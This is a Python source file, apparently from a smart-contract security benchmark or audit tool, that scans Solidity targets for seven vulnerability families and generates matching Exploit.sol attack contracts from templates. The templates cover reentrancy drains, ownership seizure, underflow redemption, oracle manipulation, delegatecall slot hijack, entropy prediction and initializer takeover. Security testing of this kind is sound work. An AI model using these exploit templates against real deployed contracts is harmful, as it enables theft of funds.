  "src": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice SAFE counterpart to OpenInitializer. The initializer is locked with\n/// an `initialized` flag and is invoked in the constructor by the deployer, so\n/// no later caller can re-run it to seize admin.\ncontract GuardedInitializer {\n    address public admin;      // slot 0\n    bool private initialized;  // slot 1\n\n    constructor() payable {\n        _init(address(0xA11CE));\n    }\n\n    function initialize(address who) external {\n        _init(who);\n    }\n\n    function _init(address who) internal {\n        require(!initialized, \"already initialized\");\n        initialized = true;\n        admin = who;\n    }\n\n    function sweep(address payable to) external {\n        require(msg.sender == admin, \"not admin\");\n        (bool ok, ) = to.call{value: address(this).balance}(\"\");\n        require(ok, \"sweep failed\");\n    }\n\n    receive() external payable {}\n}\n",
  "inv": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\ninterface IAdmin { function admin() external view returns (address); }\n\ncontract Invariants {\n    address constant INITIAL_ADMIN = address(0xA11CE);\n    function ownerUnchanged(address target) public view returns (bool) {\n        return IAdmin(target).admin() == INITIAL_ADMIN;\n    }\n    function checkAll(address target) external view returns (bool allHold, string memory firstViolated) {\n        if (!ownerUnchanged(target)) return (false, \"ownerUnchanged\");\n        return (true, \"\");\n    }\n}\n",
  "manifest": {
   "schema": "trust404.track04.manifest/0.1",
   "target": {
    "name": "GuardedInitializer",
    "src": "src/GuardedInitializer.sol",
    "solc": "0.8.24",
    "evm_version": "cancun"
   },
   "deploy": {
    "mode": "local",
    "constructor_args": [],
    "value_wei": "1000000000000000000"
   },
   "determinism": {
    "block_number": 21000000,
    "block_timestamp": 1735689600,
    "seed": 42
   },
   "invariants": {
    "contract": "Invariants.sol",
    "predicates": [
     "ownerUnchanged"
    ]
   },
   "budget": {
    "timeout_sec": 300,
    "max_attempts": 6
   }
  }
 }
}

# Disk is the source of truth when targets/ is shipped (CLI/Docker/CI).
# Embedded copies above remain the Vercel serverless fallback.
try:
    from trust404.targets import load_all as _load_targets_disk
    _disk = _load_targets_disk()
    if _disk:
        TARGETS.update(_disk)
except Exception:
    pass

# TRUST404 Track04 — static scanner.
# 타깃 소스를 정규식/패턴으로 훑어 (a) 취약 유형별 점수와 (b) 템플릿 파라미터화에
# 필요한 함수 시그니처를 추출한다. 특정 타깃 이름을 하드코딩하지 않는다 —
# 공개셋에 없는 비공개 타깃에도 같은 패턴 규칙이 적용되게 한다.

FAM_REENTRANCY = "reentrancy"
FAM_ACCESS = "access_control"
FAM_INTEGER = "integer_underflow"
FAM_ORACLE = "oracle_manipulation"
FAM_DELEGATECALL = "delegatecall_hijack"
FAM_RANDOMNESS = "weak_randomness"
FAM_INIT = "unprotected_init"
_ENTROPY_TOKENS = ("block.timestamp","block.prevrandao","block.difficulty","block.number","blockhash","block.coinbase","block.gaslimit",)


def _strip_comments(src):
    src = re.sub(r"//[^\n]*", "", src)
    src = re.sub(r"/\*.*?\*/", "", src, flags=re.S)
    return src


def _functions(src):
    """Yield dicts describing each function: name, args(list of (type,name)), mods, body."""
    out = []
    # match `function name(args) visibility modifiers { ... }`
    pat = re.compile(
        r"function\s+(\w+)\s*\(([^)]*)\)([^\{;]*)(\{)", re.S)
    for m in pat.finditer(src):
        name = m.group(1)
        raw_args = m.group(2).strip()
        head = m.group(3)
        body = _extract_block(src, m.end() - 1)
        args = []
        if raw_args:
            for a in raw_args.split(","):
                parts = a.split()
                if not parts:
                    continue
                typ = parts[0]
                an = parts[-1] if len(parts) > 1 else ""
                args.append((typ, an))
        out.append({
            "name": name,
            "args": args,
            "head": head,
            "payable": "payable" in head,
            "external": ("external" in head or "public" in head),
            "body": body,
        })
    return out


def _extract_block(src, brace_idx):
    depth = 0
    i = brace_idx
    n = len(src)
    while i < n:
        c = src[i]
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return src[brace_idx + 1:i]
        i += 1
    return src[brace_idx + 1:]


def _has_owner_guard(fn, src):
    b = fn["body"]
    if re.search(r"only\w*[Oo]wner", fn["head"]):
        return True
    if re.search(r"require\s*\(\s*msg\.sender\s*==\s*owner", b):
        return True
    if re.search(r"only\w+", fn["head"]) and "owner" in src.lower():
        # custom modifier referencing owner elsewhere
        return True
    return False


_RECEIVER_HOOKS = ("checkOnERC721Received", "onERC721Received",
                   "onERC1155Received", "onERC1155BatchReceived", "tokensReceived")

def static_findings(contract_src):
    """동적 증명이 성립하지 않는(또는 샌드박스가 모델링 못 하는) 취약 패턴을 정적
    신호로 잡아 '휴리스틱' 소견으로 낸다. 오탐 억제를 위해 고신호 조합만 발화한다.
    현재 계열:
      - receiver-callback-before-mint 재진입 + tx.origin==msg.sender EOA 게이트
        (EIP-7702 로 코드 보유 EOA 가 게이트를 통과해 재진입 → 민팅 한도/유일성 우회)."""
    out = []
    src = _strip_comments(contract_src)
    hook_re = re.compile(r"\b(" + "|".join(_RECEIVER_HOOKS) + r")\s*\(")
    mint_re = re.compile(r"\b(_safeMint|_mint|_update)\s*\(")
    txorigin = bool(re.search(r"tx\.origin\s*==\s*msg\.sender|msg\.sender\s*==\s*tx\.origin", src))
    has_guard_import = "nonReentrant" in src
    for fn in _functions(src):
        b = fn["body"]
        hm = hook_re.search(b); mm = mint_re.search(b)
        # receiver 훅이 있고, 같은 함수에서 mint/state-commit 보다 '먼저' 실행되면 CEI 위반
        if not hm:
            continue
        hook_before_mint = bool(mm) and hm.start() < mm.start()
        # balanceOf 등 per-caller 가드가 훅보다 앞서 검사됨(우회 대상)
        gm = re.search(r"balanceOf\s*\(\s*msg\.sender\s*\)|balanceOf\s*\(\s*_?to\s*\)", b)
        guard_before_hook = bool(gm) and gm.start() < hm.start()
        if not (hook_before_mint and guard_before_hook):
            continue
        this_guarded = "nonReentrant" in fn["head"]
        # 이 취약 코어를 호출하는 공개 진입점 중 nonReentrant 없이 도달 가능한 것
        callers = [f for f in _functions(src)
                   if re.search(r"\b" + re.escape(fn["name"]) + r"\s*\(", f["body"]) and f["name"] != fn["name"]]
        unguarded_entry = None
        for c in callers:
            if "nonReentrant" not in c["head"]:
                unguarded_entry = c["name"]; break
        # 코어 자체가 public 이고 nonReentrant 없으면 그것도 무방비 진입점
        if fn["external"] and not this_guarded and unguarded_entry is None:
            unguarded_entry = fn["name"]
        if unguarded_entry is None and (this_guarded or not callers):
            continue
        entry = unguarded_entry or fn["name"]
        eip7702 = txorigin and any(
            re.search(r"tx\.origin\s*==\s*msg\.sender|msg\.sender\s*==\s*tx\.origin", c["body"])
            for c in _functions(src) if c["name"] == entry)
        why = (f"`{fn['name']}` 가 mint 이전에 수신자 콜백({hm.group(1)})을 호출하는데, "
               f"per-caller 가드(balanceOf)가 그 앞에서만 검사됩니다(CEI 위반). "
               f"`{entry}` 경로는 nonReentrant 가 없어 콜백 도중 재진입해 가드/유일성을 우회할 수 있습니다.")
        if eip7702:
            why += (" 이 경로의 `tx.origin == msg.sender` EOA 게이트는 EIP-7702(Pectra) 로 "
                    "코드를 위임받은 EOA 가 통과할 수 있어, 컨트랙트가 아닌 EOA 로도 콜백 재진입이 성립합니다.")
        out.append({
            "rule": "SWC-107", "cwe": "CWE-841",
            "title": ("Reentrancy via receiver callback before mint"
                      + (" (EIP-7702 tx.origin bypass)" if eip7702 else "")),
            "severity": "HIGH",
            "family": "reentrancy",
            "function": entry, "core": fn["name"],
            "eip7702": eip7702,
            "why": why,
            "fix": ("Checks-Effects-Interactions 준수: 상태 변경(_mint) 후에 수신자 콜백을 호출하고 "
                    "(_safeMint 는 mint 뒤 콜백), 모든 mint 경로에 nonReentrant 적용. "
                    "tx.origin==msg.sender 를 EOA 판별로 쓰지 말 것(EIP-7702 로 무력화)."),
        })
    # ── 계열: 커밋먼트 해시 루프의 off-by-one (마지막 원소 미포함) ──
    # keccak 누산 루프가 `i < arr.length - 1` 로 돌면 배열의 '마지막' 원소가 커밋 해시에
    # 포함되지 않는다. 이 해시가 리플레이 키/메시지 슬롯으로 쓰이면, 실제 실행되는(전체
    # 배열) 내용과 커밋된 내용이 어긋나 위·변조/리플레이가 가능하다(브리지 포털 류).
    for fn in _functions(src):
        b = fn["body"]
        for lm in re.finditer(r"for\s*\([^;]*;\s*\w+\s*<\s*(\w+)\s*\.\s*length\s*-\s*1\s*;", b):
            arr = lm.group(1)
            after = b[lm.end():]
            seg = after[:after.find("}") + 1] if "}" in after else after
            # 루프 본문이 그 배열 원소를 keccak 누산에 쓰는가
            if re.search(r"keccak256\s*\([^)]*" + re.escape(arr) + r"\s*\[", seg) or \
               (re.search(r"keccak256", seg) and re.search(re.escape(arr) + r"\s*\[\s*\w+\s*\]", seg)):
                # 그 해시가 커밋/슬롯/리플레이 키로 쓰이는 정황(같은 함수가 keccak 을 반환/키로)
                looks_commit = bool(re.search(r"return\s+keccak256|Slot|withdrawalHash|messageHash|commit", fn["body"], re.I)) \
                               or "return" in fn["body"]
                if looks_commit:
                    out.append({
                        "rule": "TR404-COMMIT", "cwe": "CWE-670",
                        "title": "Off-by-one commitment: last array element not bound to the hash",
                        "severity": "HIGH", "family": "commitment_mismatch",
                        "function": fn["name"], "core": fn["name"], "eip7702": False,
                        "why": (f"`{fn['name']}` 의 커밋 해시 루프가 `{arr}.length - 1` 까지만 돌아 "
                                f"`{arr}` 의 **마지막 원소(및 대응 데이터)** 를 해시에 포함하지 않습니다. "
                                "이 해시가 리플레이 키/메시지 슬롯으로 쓰이면, 실제로 실행·소비되는 전체 "
                                "배열과 커밋된 내용이 어긋나 서명/증명된 것과 다른 마지막 연산을 끼워 넣거나 "
                                "(길이 1이면 전부) 위·변조·리플레이할 수 있습니다."),
                        "fix": (f"루프 상한을 `{arr}.length`(마지막 원소 포함)로 고치고, 커밋 해시가 실제 "
                                "실행에 쓰이는 모든 배열 원소를 빠짐없이 바인딩하도록 하십시오. 커밋과 실행이 "
                                "같은 데이터를 쓰는지 불변식으로 검증."),
                    })
                    break
    return out


def scan_target(contract_src, invariants_src, manifest):
    src = _strip_comments(contract_src)
    fns = _functions(src)
    scores = {
        FAM_REENTRANCY: 0, FAM_ACCESS: 0, FAM_INTEGER: 0, FAM_ORACLE: 0,
        FAM_DELEGATECALL: 0, FAM_RANDOMNESS: 0, FAM_INIT: 0,
    }
    sig = {"functions": fns}

    # ── Reentrancy ────────────────────────────────────────────────────────────
    # external call sending value, and state zeroed/decremented AFTER the call
    # (CEI violation), without a reentrancy mutex.
    has_mutex = bool(re.search(r"nonReentrant|locked\s*==\s*1|_status", src))
    # CEI violated when the caller's ledger is not cleared BEFORE the external
    # call — classic (clear after) or cross-function (clear in a helper). Any
    # ledger name, not just `balance*`.
    _clear = r"\w+\[\s*msg\.sender\s*\]\s*(=\s*0|-=)"
    for fn in fns:
        b = fn["body"]
        call_m = re.search(r"\.call\s*\{\s*value\s*:", b)
        if not call_m:
            continue
        pays_sender = bool(re.search(r"call\s*\{\s*value\s*:\s*\w+\s*\}\s*\(\s*\"\"\s*\)", b)) or "msg.sender.call" in b
        if not pays_sender:
            continue
        if not re.search(_clear, b[:call_m.start()]):
            scores[FAM_REENTRANCY] += 5
            sig.setdefault("reentrancy_withdraw", fn)
    if has_mutex:
        scores[FAM_REENTRANCY] -= 4  # guarded → likely safe
    for fn in fns:
        if fn["payable"] and re.search(r"\w+\[\s*msg\.sender\s*\]\s*\+=\s*msg\.value", fn["body"]):
            sig.setdefault("reentrancy_deposit", fn)

    # ── Access control ────────────────────────────────────────────────────────
    for fn in fns:
        if not fn["external"]:
            continue
        b = fn["body"]
        moves_value = re.search(r"\.call\s*\{\s*value\s*:", b)
        sets_owner = re.search(r"\bowner\s*=", b)
        if (moves_value or sets_owner) and not _has_owner_guard(fn, src):
            # ignore the normal user withdraw that checks its own balance
            checks_self_balance = re.search(r"balance[sf]?\w*\[\s*msg\.sender\s*\]", b)
            if moves_value and checks_self_balance and not sets_owner:
                continue
            scores[FAM_ACCESS] += 5
            if moves_value:
                sig["access_drain"] = fn
            if sets_owner:
                sig["access_setowner"] = fn

    # ── Integer underflow ─────────────────────────────────────────────────────
    for m in re.finditer(r"unchecked\s*\{", src):
        blk = _extract_block(src, src.index("{", m.start()))
        if re.search(r"balance[sfO]?\w*\[[^\]]+\]\s*-=", blk):
            scores[FAM_INTEGER] += 5
    # need a redeem/withdraw that pays out `amount` for the drain to matter
    for fn in fns:
        b = fn["body"]
        if re.search(r"\.call\s*\{\s*value\s*:", b) and any(t.startswith("uint") for t, _ in fn["args"]):
            sig["integer_redeem"] = fn
        if re.search(r"balance[sfO]?\w*\[\s*msg\.sender\s*\]\s*-=", b) and len(fn["args"]) >= 2:
            sig["integer_transfer"] = fn

    # ── Oracle manipulation ───────────────────────────────────────────────────
    if re.search(r"spotPrice|getPrice|priceOf|reserve[01A-Za-z]*", src):
        if re.search(r"\bborrow\b", src) and re.search(r"spotPrice|getPrice|reserve", src):
            scores[FAM_ORACLE] += 5
    if re.search(r"\bfaucet\b", src):
        scores[FAM_ORACLE] += 1
    if re.search(r"swap\w*For\w*|swap\s*\(", src):
        scores[FAM_ORACLE] += 1
    for fn in fns:
        if fn["name"] == "borrow":
            sig["oracle_borrow"] = fn
        if fn["name"] == "faucet":
            sig["oracle_faucet"] = fn
        if fn["name"] == "depositCollateral":
            sig["oracle_deposit"] = fn
        if re.match(r"swap\w*For\w*", fn["name"] or ""):
            sig["oracle_swap"] = fn

    # ── Delegatecall hijack ───────────────────────────────────────────────────
    # A function that delegatecalls an address it received as a PARAMETER runs
    # attacker code in this contract's storage → owner/admin (slot 0) can be
    # overwritten. Delegatecall to an immutable/state module is not attacker-
    # controlled and is not flagged (LibraryVault stays safe).
    for fn in fns:
        if not fn["external"]:
            continue
        b = fn["body"]
        m = re.search(r"(\w+)\s*\.\s*delegatecall\s*\(", b)
        if not m:
            continue
        receiver = m.group(1)
        addr_params = [an for (t, an) in fn["args"] if t == "address"]
        has_bytes = any(t.startswith("bytes") for t, _ in fn["args"])
        if receiver in addr_params:
            # attacker supplies the delegatecall target
            scores[FAM_DELEGATECALL] += 5
            sig["delegatecall_entry"] = {"fn": fn, "receiver": receiver, "has_bytes": has_bytes}
        # receiver is a state var / immutable → not attacker-controlled → no score

    # ── Weak / predictable randomness ─────────────────────────────────────────
    # A payout gated on an on-chain entropy source the caller can read in the
    # same tx is exploitable: the attacker computes the identical value and
    # always wins. Require (entropy source) AND (keccak256 or modulo mixing)
    # AND (a value transfer) in the same function, so a mere block.timestamp
    # deadline check does not trip it.
    for fn in fns:
        if not fn["external"]:
            continue
        b = fn["body"]
        has_entropy = any(tok in b for tok in _ENTROPY_TOKENS)
        mixes = ("keccak256" in b) or ("%" in b)
        transfers = bool(re.search(r"\.call\s*\{\s*value\s*:", b)) or \
            bool(re.search(r"balance[sfO]?\w*\[[^\]]+\]\s*\+=", b))
        if has_entropy and mixes and transfers:
            scores[FAM_RANDOMNESS] += 5
            sig["randomness_fn"] = fn

    # ── Unprotected initializer ───────────────────────────────────────────────
    # An initializer that sets owner/admin with neither an `initialized` guard
    # nor access control lets the first caller seize the contract. A guarded
    # initializer (require(!initialized) / initializer modifier) is safe.
    init_name = re.compile(r"^(initialize|init|initializer|__init)\w*$", re.I)
    for fn in fns:
        if not fn["external"]:
            continue
        b = fn["body"]
        head = fn["head"]
        looks_init = bool(init_name.match(fn["name"]))
        sets_privilege_to_sender = bool(
            re.search(r"\b(owner|admin)\b\s*=\s*msg\.sender", b))
        sets_privilege_to_param = bool(
            re.search(r"\b(owner|admin)\b\s*=\s*\w+", b)) and looks_init
        guarded = bool(
            re.search(r"require\s*\(\s*!\s*\w*[Ii]nitialized", b)
            or re.search(r"\binitializer\b", head)
            or "_disableInitializers" in src
            or _has_owner_guard(fn, src))
        if (looks_init or sets_privilege_to_sender) and \
           (sets_privilege_to_sender or sets_privilege_to_param) and not guarded:
            scores[FAM_INIT] += 5
            sig["init_fn"] = fn

    sig["scores"] = scores
    sig["invariant_predicates"] = manifest.get("invariants", {}).get("predicates", [])
    return sig


# Keep the API and Track CLI on the same scanner rules. The embedded scanner
# above remains only as a serverless fallback reference; the shipped bundle
# always includes trust404.scan.
from trust404.scan import scan_target as scan_target


# TRUST404 Track04 — strategy selection + Exploit.sol templates.
# 각 취약 유형에 대해, scanner 가 뽑은 함수 시그니처를 채워 Exploit.sol 을
# 결정론적으로 생성한다. 함수 이름을 하드코딩하지 않고 스캔 결과에서 가져오되,
# 못 찾으면 이 트랙 공개셋의 관례적 이름으로 폴백한다.


STRATEGY_ORDER = [FAM_REENTRANCY, FAM_ACCESS, FAM_INTEGER, FAM_ORACLE, FAM_DELEGATECALL, FAM_RANDOMNESS, FAM_INIT]

HEADER = "// SPDX-License-Identifier: MIT\npragma solidity >=0.6.2;\n\n"


def seeded_order(order, scores, seed):
    """Deterministic ordering: score desc, ties broken by a seeded PRNG so the
    same --seed always yields the same sequence."""
    rng = random.Random(seed)
    buckets = {}
    for fam in order:
        buckets.setdefault(scores.get(fam, 0), []).append(fam)
    result = []
    for score in sorted(buckets.keys(), reverse=True):
        group = buckets[score][:]
        rng.shuffle(group)
        result.extend(group)
    return result


def _fn_name(findings, key, default):
    fn = findings.get(key)
    return fn["name"] if fn else default


def build_exploit(fam, findings):
    scores = findings["scores"]
    if scores.get(fam, 0) <= 0:
        return None
    if fam == FAM_REENTRANCY:
        return _reentrancy(findings)
    if fam == FAM_ACCESS:
        return _access(findings)
    if fam == FAM_INTEGER:
        return _integer(findings)
    if fam == FAM_ORACLE:
        return _oracle(findings)
    if fam == FAM_DELEGATECALL:
        return _delegatecall(findings)
    if fam == FAM_RANDOMNESS:
        return _randomness(findings)
    if fam == FAM_INIT:
        return _init(findings)
    return None


def _reentrancy(findings):
    deposit = _fn_name(findings, "reentrancy_deposit", "deposit")
    wfn = findings.get("reentrancy_withdraw")
    withdraw = wfn["name"] if wfn else "withdraw"
    # withdraw may take a uint amount or no args
    wargs = wfn["args"] if wfn else []
    takes_amount = any(t.startswith("uint") for t, _ in wargs)
    if takes_amount:
        iface = (f"interface ITarget {{\n"
                 f"    function {deposit}() external payable;\n"
                 f"    function {withdraw}(uint256 amount) external;\n"
                 f"}}\n\n")
        run_call = f"target.{withdraw}(unit);"
        re_call = f"target.{withdraw}(unit);"
    else:
        iface = (f"interface ITarget {{\n"
                 f"    function {deposit}() external payable;\n"
                 f"    function {withdraw}() external;\n"
                 f"}}\n\n")
        run_call = f"target.{withdraw}();"
        re_call = f"target.{withdraw}();"
    body = (
        "// Strategy: reentrancy (CEI violation) — re-enter withdraw before the\n"
        "// balance is zeroed, draining the seed float below the solvency floor.\n"
        + iface +
        "contract Exploit {\n"
        "    ITarget public target;\n"
        "    uint256 public unit;\n\n"
        "    function run(address _t) external payable {\n"
        "        target = ITarget(_t);\n"
        "        unit = 1 ether;\n"
        f"        target.{deposit}{{value: unit}}();\n"
        f"        {run_call}\n"
        "    }\n\n"
        "    receive() external payable {\n"
        f"        if (address(target).balance >= unit) {{ {re_call} }}\n"
        "    }\n"
        "}\n"
    )
    return HEADER + body


def _access(findings):
    drain = findings.get("access_drain")
    setowner = findings.get("access_setowner")
    lines = []
    ifaces = []
    if setowner:
        ifaces.append(f"    function {setowner['name']}(address newOwner) external;")
    if drain:
        # signature: figure out arg order (address to, uint amount) heuristically
        args = drain["args"]
        addr_first = args and args[0][0] == "address"
        if addr_first and len(args) >= 2:
            ifaces.append(f"    function {drain['name']}(address to, uint256 amount) external;")
            lines.append(f"        t.{drain['name']}(address(this), address(_t).balance);")
        elif len(args) >= 1 and args[0][0].startswith("uint"):
            ifaces.append(f"    function {drain['name']}(uint256 amount) external;")
            lines.append(f"        t.{drain['name']}(address(_t).balance);")
        else:
            ifaces.append(f"    function {drain['name']}() external;")
            lines.append(f"        t.{drain['name']}();")
    if setowner:
        lines.insert(0, f"        t.{setowner['name']}(address(this));")
    if not lines:
        return None
    body = (
        "// Strategy: broken access control — call the unguarded privileged\n"
        "// function(s) directly to seize ownership and/or drain the vault.\n"
        "interface ITarget {\n" + "\n".join(ifaces) + "\n}\n\n"
        "contract Exploit {\n"
        "    function run(address _t) external payable {\n"
        "        ITarget t = ITarget(_t);\n"
        + "\n".join(lines) + "\n"
        "    }\n"
        "    receive() external payable {}\n"
        "}\n"
    )
    return HEADER + body


def _integer(findings):
    transfer = _fn_name(findings, "integer_transfer", "transfer")
    redeem = _fn_name(findings, "integer_redeem", "redeem")
    body = (
        "// Strategy: integer underflow (unchecked) — underflow the caller's\n"
        "// balance to ~2**256 via transfer, then redeem the entire ETH float.\n"
        "interface ITarget {\n"
        f"    function {transfer}(address to, uint256 amount) external;\n"
        f"    function {redeem}(uint256 amount) external;\n"
        "}\n\n"
        "contract Exploit {\n"
        "    function run(address _t) external payable {\n"
        "        ITarget t = ITarget(_t);\n"
        f"        t.{transfer}(address(0xdEaD), 1);\n"
        f"        t.{redeem}(address(_t).balance);\n"
        "    }\n"
        "    receive() external payable {}\n"
        "}\n"
    )
    return HEADER + body


def _oracle(findings):
    faucet = _fn_name(findings, "oracle_faucet", "faucet")
    swap = _fn_name(findings, "oracle_swap", "swapBorForCol")
    deposit = _fn_name(findings, "oracle_deposit", "depositCollateral")
    borrow = _fn_name(findings, "oracle_borrow", "borrow")
    body = (
        "// Strategy: spot-price oracle manipulation — mint free BOR from the\n"
        "// faucet, swap it to drain COL reserves and spike the spot price, then\n"
        "// deposit the received COL and borrow against the inflated valuation.\n"
        "interface IERC20 {\n"
        "    function approve(address s, uint256 a) external returns (bool);\n"
        "    function balanceOf(address w) external view returns (uint256);\n"
        "}\n"
        "interface IPool {\n"
        f"    function {swap}(uint256 borIn) external;\n"
        "    function spotPrice() external view returns (uint256);\n"
        "}\n"
        "interface ITarget {\n"
        "    function collateralToken() external view returns (address);\n"
        "    function borrowToken() external view returns (address);\n"
        "    function pool() external view returns (address);\n"
        f"    function {faucet}() external;\n"
        f"    function {deposit}(uint256 amount) external;\n"
        f"    function {borrow}(uint256 amount) external;\n"
        "    function collateralOf(address w) external view returns (uint256);\n"
        "}\n\n"
        "contract Exploit {\n"
        "    function run(address _t) external payable {\n"
        "        ITarget o = ITarget(_t);\n"
        "        IERC20 col = IERC20(o.collateralToken());\n"
        "        IERC20 bor = IERC20(o.borrowToken());\n"
        "        address pool = o.pool();\n"
        f"        for (uint256 i = 0; i < 5; i++) {{ o.{faucet}(); }}\n"
        "        uint256 borBal = bor.balanceOf(address(this));\n"
        "        bor.approve(pool, type(uint256).max);\n"
        f"        IPool(pool).{swap}(borBal);\n"
        "        uint256 colBal = col.balanceOf(address(this));\n"
        "        col.approve(_t, type(uint256).max);\n"
        f"        o.{deposit}(colBal);\n"
        "        uint256 price = IPool(pool).spotPrice();\n"
        "        uint256 value = (o.collateralOf(address(this)) * price) / 1e18;\n"
        f"        o.{borrow}(value);\n"
        "    }\n"
        "    receive() external payable {}\n"
        "}\n"
    )
    return HEADER + body



def _delegatecall(findings):
    """Ethernaut Delegation/Preservation class: the target delegatecalls an
    attacker-supplied module, so a module that writes storage slot 0 seizes
    `owner`/`admin`. We deploy such a module and route the target through it."""
    entry = findings.get("delegatecall_entry")
    if not entry or not entry.get("has_bytes"):
        return None
    name = entry["fn"]["name"]
    # Reconstruct the entry signature: (address <recv>, bytes <data>) in the
    # order they were declared, so we call it exactly as the target expects.
    args = entry["fn"]["args"]
    parts = []
    call_args = []
    for typ, _an in args:
        if typ == "address":
            parts.append("address")
            call_args.append("address(pwn)")
        elif typ.startswith("bytes"):
            parts.append("bytes calldata")  # reference type needs a data location
            call_args.append('abi.encodeWithSignature("hijack()")')
        elif typ.startswith("uint"):
            parts.append("uint256")
            call_args.append("0")
        else:
            parts.append(typ)
            call_args.append("0")
    sig_types = ",".join(parts)
    call = f"        t.{name}({', '.join(call_args)});"
    slot = 0
    try:
        from trust404.layout import privileged_slot, pwn_hijack
        slot = privileged_slot(findings.get("src") or "")
        pwn_body = pwn_hijack(slot)
    except Exception:
        pwn_body = (
            "    address public slot0;\n"
            "    function hijack() external { slot0 = msg.sender; }\n"
        )
    body = (
        "// Strategy: delegatecall hijack — the target delegatecalls a module\n"
        "// we control, so our module runs in the target's storage context and\n"
        f"// overwrites slot {slot} (owner/admin). No import needed.\n"
        "interface ITarget {\n"
        f"    function {name}({sig_types}) external;\n"
        "}\n\n"
        "contract Pwn {\n"
        + pwn_body +
        "}\n\n"
        "contract Exploit {\n"
        "    function run(address _t) external payable {\n"
        "        ITarget t = ITarget(_t);\n"
        "        Pwn pwn = new Pwn();\n"
        f"{call}\n"
        "    }\n"
        "    receive() external payable {}\n"
        "}\n"
    )
    return HEADER + body


def _randomness(findings):
    """Ethernaut CoinFlip / Capture-the-Ether Predict-the-Future class: the
    payout is gated on block entropy the caller can read in the same tx. We
    replicate the exact mixing expression and always submit the winning value,
    looping until the house float is drained below its solvency floor."""
    fn = findings.get("randomness_fn")
    if not fn:
        return None
    name = fn["name"]
    b = fn["body"]
    # Reproduce the target's own entropy expression verbatim so the computed
    # value is identical (block.* globals resolve the same inside Exploit).
    # Capture the full right-hand side of the entropy-bearing assignment up to
    # its terminating ';' — this keeps nested parentheses balanced and picks up
    # any trailing `% N` mixing without brittle sub-parsing.
    rhs = re.search(r"=\s*([^;]*(?:block\.|blockhash)[^;]*?)\s*;", b, re.S)
    if rhs:
        rand_expr = rhs.group(1).strip()
    else:
        # fall back to a common predictable source
        rand_expr = "uint256(blockhash(block.number - 1))"
    ante_m = re.search(r"msg\.value\s*==\s*(\d+)\s*ether", b)
    ante = f"{ante_m.group(1)} ether" if ante_m else "1 ether"
    payout_m = re.search(r"call\s*\{\s*value\s*:\s*(\d+)\s*ether", b)
    payout = f"{payout_m.group(1)} ether" if payout_m else "1 ether"
    # match the guess parameter type (default uint256)
    guess_type = "uint256"
    for typ, _an in fn["args"]:
        if typ.startswith("uint") or typ == "bool":
            guess_type = "uint256" if typ.startswith("uint") else "bool"
            break
    if guess_type == "bool":
        pick = f"(({rand_expr}) == 1)"
        param = "bool"
    else:
        pick = f"({rand_expr})"
        param = "uint256"
    getters = []
    try:
        from trust404.layout import rewrite_mixed
        pick, getters = rewrite_mixed(pick, findings.get("src") or "", obj="t")
    except Exception:
        getters = []
    getter_ifaces = "".join(
        f"    function {g}() external view returns (uint256);\n" for g in getters
    )
    body = (
        "// Strategy: weak randomness — the payout is decided by block entropy\n"
        "// mixed with public nonce/seed we read off the target in the same tx.\n"
        "interface ITarget {\n"
        f"    function {name}({param} guess) external payable;\n"
        + getter_ifaces +
        "}\n\n"
        "contract Exploit {\n"
        f"    uint256 constant ANTE = {ante};\n"
        f"    uint256 constant PAYOUT = {payout};\n"
        "    function run(address _t) external payable {\n"
        "        ITarget t = ITarget(_t);\n"
        "        for (uint256 i = 0; i < 64; i++) {\n"
        "            if (_t.balance < PAYOUT) break;\n"
        f"            {param} guess = {pick};\n"
        f"            t.{name}{{value: ANTE}}(guess);\n"
        "        }\n"
        "    }\n"
        "    receive() external payable {}\n"
        "}\n"
    )
    return HEADER + body


def _init(findings):
    """Ethernaut Motorbike / uninitialized-proxy class: an initializer with no
    `initialized` guard and no access control lets the first caller take the
    admin/owner slot. We simply call it and become the privileged account."""
    fn = findings.get("init_fn")
    if not fn:
        return None
    name = fn["name"]
    addr_args = [a for a in fn["args"] if a[0] == "address"]
    if addr_args:
        iface = f"    function {name}(address) external;"
        call = f"        t.{name}(address(this));"
    elif fn["args"]:
        # unexpected arity — fall back to no-arg attempt guarded by interface
        iface = f"    function {name}() external;"
        call = f"        t.{name}();"
    else:
        iface = f"    function {name}() external;"
        call = f"        t.{name}();"
    body = (
        "// Strategy: unprotected initializer — the admin/owner slot is left\n"
        "// claimable, so we call the open initializer and seize it.\n"
        "interface ITarget {\n"
        f"{iface}\n"
        "}\n\n"
        "contract Exploit {\n"
        "    function run(address _t) external payable {\n"
        "        ITarget t = ITarget(_t);\n"
        f"{call}\n"
        "    }\n"
        "    receive() external payable {}\n"
        "}\n"
    )
    return HEADER + body


def _ensure_solc():
    import solcx
    solcx_dir = os.environ.get("SOLCX_BINARY_PATH")
    if solcx_dir:
        os.makedirs(solcx_dir, exist_ok=True)
    try:
        solcx.install_solc(SOLC)  # idempotent; downloads to SOLCX_BINARY_PATH if missing
    except Exception:
        pass
    solcx.set_solc_version(SOLC)


# 컨트랙트의 pragma 에 맞춰 실제 solc 버전을 골라 컴파일한다(멀티버전 백엔드).
# pre-0.8 레벨(정수 오버·언더플로 등)의 진짜 의미를 재현하기 위함.
_PATCH = {(0, 4): 26, (0, 5): 17, (0, 6): 12, (0, 7): 6, (0, 8): 28}

def _resolve_solc(spec):
    spec = (spec or "").strip()
    mx = re.fullmatch(r"(\d+)\.(\d+)\.(\d+)", spec)   # 정확 핀 (예: 0.8.19)
    if mx:
        return tuple(int(x) for x in mx.groups())
    m = re.search(r"(\d+)\.(\d+)(?:\.(\d+))?", spec)  # 범위 (^0.6.0, >=0.7.0 등)
    if not m:
        return (0, 8, 24)
    major, minor = int(m.group(1)), int(m.group(2))
    patch = _PATCH.get((major, minor), int(m.group(3) or 0))
    return (major, minor, patch)

def _solc_for(target_src):
    """타깃 pragma 로 solc 버전을 정해 설치·설정하고 (버전문자열, evmVersion) 반환."""
    import solcx
    solcx_dir = os.environ.get("SOLCX_BINARY_PATH")
    if solcx_dir:
        os.makedirs(solcx_dir, exist_ok=True)
    m = re.search(r"pragma\s+solidity\s+([^;]+);", target_src or "")
    ver = _resolve_solc(m.group(1) if m else SOLC)
    vs = ".".join(str(x) for x in ver)
    try:
        installed = [tuple(map(int, str(v).split("."))) for v in solcx.get_installed_solc_versions()]
    except Exception:
        installed = []
    if ver not in installed:
        try:
            solcx.install_solc(vs)
        except Exception:
            ver = _resolve_solc(SOLC); vs = SOLC       # 실패 시 기본으로 폴백
